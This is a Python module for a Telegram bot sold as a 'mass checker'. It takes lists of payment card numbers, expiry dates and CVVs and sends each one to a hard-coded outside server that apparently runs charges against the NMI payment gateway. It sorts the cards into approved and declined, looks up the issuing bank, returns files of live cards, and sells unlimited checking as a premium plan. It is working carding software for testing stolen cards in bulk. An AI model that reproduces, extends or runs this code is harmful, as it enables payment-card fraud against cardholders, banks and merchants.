"""
NMI Mass Checker
Command: /mnmi
Type: Mass Charge
Limits: Free: 10 | Premium: Unlimited
"""

from aiogram import Router, F, types
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery, FSInputFile
import asyncio
import time
import logging
import os
import re
import random
import requests
import io
from datetime import datetime

from database import get_user_credits, update_credits, get_user
from sub import get_premium_status
from bin import get_bin_info
from mass_gates.card_cleaner import clean_cards, mask_card

router = Router()

GATE_NAME = "NMI"
GATE_CMD = "mnmi"
MNMI_API = "http://5.83.136.66:8001/nmi?cc={cc}"
active_sessions = {}

# APPROVED KEYWORDS
APPROVED_KEYWORDS = [
    "3ds", "3d secure", "challenge",
    "insufficient", "insufficient_funds",
    "cvv", "cvv2", "cvc", "security code",
    "incorrect_cvc", "incorrect cvv",
    "avs", "address", "zip",
    "fraud_suspected",
    "order_placed",
    "approved", "success", "charged", "completed", "authorized"
]

def is_approved_response(text: str) -> bool:
    text_lower = text.lower()
    for keyword in APPROVED_KEYWORDS:
        if keyword in text_lower:
            return True
    return False

def fb(text):
    bold_map = {
        'A': '𝗔', 'B': '𝗕', 'C': '𝗖', 'D': '𝗗', 'E': '𝗘', 'F': '𝗙', 'G': '𝗚', 'H': '𝗛',
        'I': '𝗜', 'J': '𝗝', 'K': '𝗞', 'L': '𝗟', 'M': '𝗠', 'N': '𝗡', 'O': '𝗢', 'P': '𝗣',
        'Q': '𝗤', 'R': '𝗥', 'S': '𝗦', 'T': '𝗧', 'U': '𝗨', 'V': '𝗩', 'W': '𝗪', 'X': '𝗫',
        'Y': '𝗬', 'Z': '𝗭',
        'a': '𝗮', 'b': '𝗯', 'c': '𝗰', 'd': '𝗱', 'e': '𝗲', 'f': '𝗳', 'g': '𝗴', 'h': '𝗵',
        'i': '𝗶', 'j': '𝗷', 'k': '𝗸', 'l': '𝗹', 'm': '𝗺', 'n': '𝗻', 'o': '𝗼', 'p': '𝗽',
        'q': '𝗾', 'r': '𝗿', 's': '𝘀', 't': '𝘁', 'u': '𝘂', 'v': '𝘃', 'w': '𝘄', 'x': '𝘅',
        'y': '𝘆', 'z': '𝘇',
        '0': '𝟬', '1': '𝟭', '2': '𝟮', '3': '𝟯', '4': '𝟰', '5': '𝟱', '6': '𝟲', '7': '𝟳',
        '8': '𝟴', '9': '𝟵',
        ' ': ' ', '.': '.', ':': ':', '|': '|', '/': '/', '-': '-', '_': '_',
        '(': '(', ')': ')', '[': '[', ']': ']', '{': '{', '}': '}', '<': '<', '>': '>',
        '!': '!', '?': '?', ',': ',', ';': ';', '+': '+', '=': '=', '*': '*', '&': '&',
        '%': '%', '#': '#', '@': '@', '$': '$', '^': '^', '~': '~',
    }
    return ''.join(bold_map.get(c, c) for c in text)

def bold_font(text):
    return fb(text)

def get_bin_data(bin_num):
    try:
        resp = requests.get(f'https://lookup.binlist.net/{bin_num}', timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            return {
                'bank': data.get('bank', {}).get('name', 'Unknown'),
                'country': data.get('country', {}).get('name', 'Unknown'),
                'emoji': data.get('country', {}).get('emoji', ''),
                'brand': data.get('scheme', 'Unknown'),
                'type': data.get('type', 'Unknown'),
            }
    except:
        pass
    return {'bank': 'Unknown', 'country': 'Unknown', 'emoji': '', 'brand': 'Unknown', 'type': 'Unknown'}

def process_single_card(card):
    try:
        resp = requests.get(MNMI_API.format(cc=card), timeout=90, verify=False)
        if resp.status_code == 200:
            data = resp.json()
            raw_message = data.get('message', 'Unknown')
            if data.get('approved', False) or is_approved_response(raw_message):
                return {"status": "APPROVED", "response": raw_message}
            else:
                return {"status": "DECLINED", "response": raw_message}
        else:
            return {"status": "ERROR", "response": f"HTTP {resp.status_code}"}
    except Exception as e:
        return {"status": "ERROR", "response": str(e)[:80]}

def get_buy_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💎 𝗕𝗨𝗬 𝗡𝗢𝗪", url="https://t.me/npnbit4")]
    ])

def build_live_message(session_data):
    total = session_data['total']
    checked = session_data['checked']
    approved = session_data['approved']
    declined = session_data['declined']
    errors = session_data['errors']
    charged = session_data.get('charged', 0)
    threeds = session_data.get('threeds', 0)
    workers = session_data.get('workers', 5)
    current_card = session_data.get('current_card', '')
    current_response = session_data.get('current_response', '')
    current_status = session_data.get('current_status', '')
    plan = session_data.get('plan', 'TRIAL')
    
    pct = int((checked / total) * 100) if total > 0 else 0
    
    if current_status == "APPROVED":
        status_display = f"✅ {bold_font('APPROVED')}"
    elif current_status == "DECLINED":
        status_display = f"❌ {bold_font('DECLINED')}"
    elif current_status == "ERROR":
        status_display = f"⚠️ {bold_font('ERROR')}"
    else:
        status_display = f"⏳ {bold_font('Checking...')}"
    
    display_card = mask_card(current_card) if current_card else "—"
    
    text = (
        f"{bold_font(f'[#] {GATE_NAME} ↦ Live ↦ ★')}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{bold_font('[#] Total ↦')} {total:,}\n"
        f"{bold_font('[#] Checked ↦')} {checked:,}\n"
        f"{bold_font('[#] Charged ↦')} {charged}\n"
        f"{bold_font('[#] Approved ↦')} {approved}\n"
        f"{bold_font('[#] 3DS ↦')} {threeds}\n"
        f"{bold_font('[#] Declined ↦')} {declined}\n"
        f"{bold_font('[#] Workers ↦')} {workers}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{bold_font(f'{pct}%')} | {checked:,} / {total:,}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{bold_font('Card:')} {display_card}\n"
        f"{bold_font('Status:')} {status_display}\n"
        f"{bold_font('Response:')} {current_response or '—'}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{bold_font('Plan:')} {plan}\n"
    )
    
    if current_response and current_response != '—':
        response_button = InlineKeyboardButton(
            text=f"📝 {bold_font('Response')} — {current_response[:35]}{'...' if len(current_response)>35 else ''}",
            callback_data=f"{GATE_CMD}_response_{session_data['user_id']}"
        )
        card_button = InlineKeyboardButton(
            text=f"💳 {display_card}",
            callback_data=f"{GATE_CMD}_card_{session_data['user_id']}"
        )
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [card_button],
            [response_button],
            [InlineKeyboardButton(text=f"⏸️ {bold_font('Pause')}", callback_data=f"{GATE_CMD}_pause_{session_data['user_id']}"),
             InlineKeyboardButton(text=f"🛑 {bold_font('Stop')}", callback_data=f"{GATE_CMD}_stop_{session_data['user_id']}")]
        ])
    else:
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text=f"⏸️ {bold_font('Pause')}", callback_data=f"{GATE_CMD}_pause_{session_data['user_id']}"),
             InlineKeyboardButton(text=f"🛑 {bold_font('Stop')}", callback_data=f"{GATE_CMD}_stop_{session_data['user_id']}")]
        ])
    
    return text, kb

@router.message(Command("mnmi"))
async def mnmi_command(message: types.Message):
    user_id = message.from_user.id
    raw_cards = []
    
    args = message.text.split(maxsplit=1)
    if len(args) > 1:
        raw_cards = clean_cards(args[1])
    
    if not raw_cards and message.reply_to_message:
        reply = message.reply_to_message
        if reply.document:
            try:
                file_id = reply.document.file_id
                file_info = await message.bot.get_file(file_id)
                downloaded = await message.bot.download_file(file_info.file_path)
                content = downloaded.read().decode('utf-8')
                raw_cards = clean_cards(content)
            except Exception as e:
                await message.answer(f"❌ Error reading file: {str(e)}")
                return
        elif reply.text:
            raw_cards = clean_cards(reply.text)
    
    if not raw_cards:
        await message.answer(
            f"{bold_font(f'[#] {GATE_NAME} ↦ Help')}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"{bold_font('Usage:')}\n"
            f"1️⃣ Paste cards after /mnmi\n"
            f"2️⃣ Reply to .txt file\n"
            f"3️⃣ Reply to text message\n\n"
            f"{bold_font('Format:')}\n"
            f"<code>CC|MM|YY|CVV</code>\n\n"
            f"{bold_font('Limits:')}\n"
            f"┣ Free: 10 cards\n"
            f"┗ Premium: Unlimited",
            parse_mode="HTML")
        return
    
    if len(raw_cards) > 0:
        await message.answer(f"✅ Cleaned {len(raw_cards)} valid cards from your input.")
    
    is_premium, _ = await asyncio.to_thread(get_premium_status, user_id)
    plan = "𝗣𝗥𝗘𝗠𝗜𝗨𝗠" if is_premium else "𝗧𝗥𝗜𝗔𝗟"
    limit = 10000 if is_premium else 10
    
    if len(raw_cards) > limit and not is_premium:
        await message.answer(
            f"⚠️ <b>𝗟𝗶𝗺𝗶𝘁 𝗥𝗲𝗮𝗰𝗵𝗲𝗱!</b>\n\n"
            f"📌 𝗙𝗿𝗲𝗲 𝘂𝘀𝗲𝗿𝘀 𝗰𝗮𝗻 𝗼𝗻𝗹𝘆 𝗰𝗵𝗲𝗰𝗸 𝟭𝟬 𝗰𝗮𝗿𝗱𝘀 𝗽𝗲𝗿 𝗺𝗮𝘀𝘀 𝗰𝗵𝗲𝗰𝗸.\n\n"
            f"💎 𝗨𝗽𝗴𝗿𝗮𝗱𝗲 𝘁𝗼 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗳𝗼𝗿:\n"
            f"┣ ✅ 𝗨𝗻𝗹𝗶𝗺𝗶𝘁𝗲𝗱 𝗰𝗮𝗿𝗱𝘀\n"
            f"┣ ✅ 𝗙𝗮𝘀𝘁𝗲𝗿 𝗰𝗵𝗲𝗰𝗸𝗶𝗻𝗴\n"
            f"┣ ✅ 𝗔𝗹𝗹 𝗴𝗮𝘁𝗲𝘄𝗮𝘆𝘀\n"
            f"┗ ✅ 𝗡𝗼 𝗱𝗮𝗶𝗹𝘆 𝗹𝗶𝗺𝗶𝘁\n\n"
            f"📢 𝗖𝗼𝗻𝘁𝗮𝗰𝘁: @npnbit4\n\n"
            f"📌 𝗤𝘂𝗶𝗰𝗸 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀:\n"
            f"┣ /buy - 𝗩𝗶𝗲𝘄 𝗽𝗹𝗮𝗻𝘀\n"
            f"┗ /info - 𝗖𝗵𝗲𝗰𝗸 𝘆𝗼𝘂𝗿 𝘀𝘁𝗮𝘁𝘂𝘀",
            parse_mode="HTML"
        )
        raw_cards = raw_cards[:limit]
    
    total = len(raw_cards)
    
    session_data = {
        'user_id': user_id,
        'cards': raw_cards,
        'total': total,
        'checked': 0,
        'approved': 0,
        'declined': 0,
        'errors': 0,
        'charged': 0,
        'threeds': 0,
        'current_card': '',
        'current_response': '',
        'current_status': '',
        'workers': 5,
        'stop': False,
        'paused': False,
        'msg_id': None,
        'chat_id': message.chat.id,
        'approved_cards': [],
        'declined_cards': [],
        'error_cards': [],
        'original_message': message,
        'plan': plan,
        'start_time': time.time(),
    }
    active_sessions[user_id] = session_data
    
    text, kb = build_live_message(session_data)
    msg = await message.answer(text, parse_mode="HTML", reply_markup=kb)
    session_data['msg_id'] = msg.message_id
    
    for idx, card in enumerate(raw_cards):
        if session_data.get('stop', False):
            break
        while session_data.get('paused', False):
            await asyncio.sleep(1)
            if session_data.get('stop', False):
                break
        
        session_data['current_card'] = card
        session_data['current_status'] = '⏳ Checking...'
        
        text, kb = build_live_message(session_data)
        try:
            await msg.edit_text(text, parse_mode="HTML", reply_markup=kb)
        except:
            pass
        
        result = process_single_card(card)
        
        session_data['checked'] += 1
        session_data['current_response'] = result['response']
        session_data['current_status'] = result['status']
        
        if result["status"] == "APPROVED":
            session_data['approved'] += 1
            session_data['approved_cards'].append(f"{card} | {result['response']}")
            bin_data = get_bin_data(card[:6])
            user_link = f'<a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a>'
            
            approved_msg = (
                f"𝗦𝘁𝗮𝘁𝘂𝘀 ➛ 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ✅\n"
                f"𝗖𝗮𝗿𝗱 ➛ <code>{card}</code>\n"
                f"𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➛ {GATE_NAME}\n"
                f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➛ <b>{result['response']}</b>\n"
                f"𝗕𝗿𝗮𝗻𝗱 ➛ {bin_data['brand']}\n"
                f"𝗜𝘀𝘀𝘂𝗲𝗿 ➛ {bin_data['bank']}\n"
                f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➛ {bin_data['country']} {bin_data['emoji']}\n"
                f"𝗨𝘀𝗲𝗿 ➛ {user_link} ({plan})\n"
                f"𝗗𝗲𝘃 ➛ npnbit4"
            )
            await message.answer(approved_msg, parse_mode="HTML", reply_markup=get_buy_keyboard())
        elif result["status"] == "DECLINED":
            session_data['declined'] += 1
            session_data['declined_cards'].append(f"{card} | {result['response']}")
        else:
            session_data['errors'] += 1
            session_data['error_cards'].append(f"{card} | {result['response']}")
        
        text, kb = build_live_message(session_data)
        try:
            await msg.edit_text(text, parse_mode="HTML", reply_markup=kb)
        except:
            pass
        
        await asyncio.sleep(random.uniform(3, 5))
    
    elapsed = f"{time.time() - session_data['start_time']:.2f}s"
    
    if not session_data.get('stop', False):
        text, kb = build_live_message(session_data)
        text += f"\n\n✅ {bold_font('Mass Check Complete!')}"
        try:
            await msg.edit_text(text, parse_mode="HTML", reply_markup=None)
        except:
            pass
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        if session_data['approved_cards']:
            approved_txt = f"APPROVED_{timestamp}.txt"
            with open(approved_txt, "w", encoding="utf-8") as f:
                f.write(f"Approved Cards ({len(session_data['approved_cards'])} total):\n\n")
                f.write("\n".join(session_data['approved_cards']))
            await message.reply_document(
                document=FSInputFile(approved_txt),
                caption=f"✅ Approved: {len(session_data['approved_cards'])} cards"
            )
            os.remove(approved_txt)
        
        if session_data['declined_cards']:
            declined_txt = f"DECLINED_{timestamp}.txt"
            with open(declined_txt, "w", encoding="utf-8") as f:
                f.write(f"Declined Cards ({len(session_data['declined_cards'])} total):\n\n")
                f.write("\n".join(session_data['declined_cards']))
            await message.reply_document(
                document=FSInputFile(declined_txt),
                caption=f"❌ Declined: {len(session_data['declined_cards'])} cards"
            )
            os.remove(declined_txt)
        
        if session_data['error_cards']:
            error_txt = f"ERRORS_{timestamp}.txt"
            with open(error_txt, "w", encoding="utf-8") as f:
                f.write(f"Error Cards ({len(session_data['error_cards'])} total):\n\n")
                f.write("\n".join(session_data['error_cards']))
            await message.reply_document(
                document=FSInputFile(error_txt),
                caption=f"⚠️ Errors: {len(session_data['error_cards'])} cards"
            )
            os.remove(error_txt)
    
    active_sessions.pop(user_id, None)

@router.callback_query(F.data.startswith("mnmi_card_"))
async def mnmi_card_callback(callback: types.CallbackQuery):
    user_id = int(callback.data.split("_")[2])
    if user_id != callback.from_user.id:
        await callback.answer("❌ Not your session!", show_alert=True)
        return
    session = active_sessions.get(user_id)
    if not session:
        await callback.answer("⚠️ No active session", show_alert=True)
        return
    card = session.get('current_card', 'No card')
    await callback.answer(f"📌 {card[:30]}...", show_alert=True)

@router.callback_query(F.data.startswith("mnmi_response_"))
async def mnmi_response_callback(callback: types.CallbackQuery):
    user_id = int(callback.data.split("_")[2])
    if user_id != callback.from_user.id:
        await callback.answer("❌ Not your session!", show_alert=True)
        return
    session = active_sessions.get(user_id)
    if not session:
        await callback.answer("⚠️ No active session", show_alert=True)
        return
    response = session.get('current_response', 'No response')
    status = session.get('current_status', 'Unknown')
    await callback.answer(f"📊 {status}: {response[:60]}", show_alert=True)

@router.callback_query(F.data.startswith("mnmi_stop_"))
async def mnmi_stop_callback(callback: types.CallbackQuery):
    user_id = int(callback.data.split("_")[2])
    if user_id != callback.from_user.id:
        await callback.answer("❌ Not your session!", show_alert=True)
        return
    if user_id in active_sessions:
        active_sessions[user_id]['stop'] = True
        await callback.answer("🛑 Stopping...", show_alert=True)
    else:
        await callback.answer("⚠️ No active session", show_alert=True)

@router.callback_query(F.data.startswith("mnmi_pause_"))
async def mnmi_pause_callback(callback: types.CallbackQuery):
    user_id = int(callback.data.split("_")[2])
    if user_id != callback.from_user.id:
        await callback.answer("❌ Not your session!", show_alert=True)
        return
    session = active_sessions.get(user_id)
    if session:
        session['paused'] = not session.get('paused', False)
        status = "⏸️ Paused" if session['paused'] else "▶️ Resumed"
        await callback.answer(status, show_alert=True)
    else:
        await callback.answer("⚠️ No active session", show_alert=True)
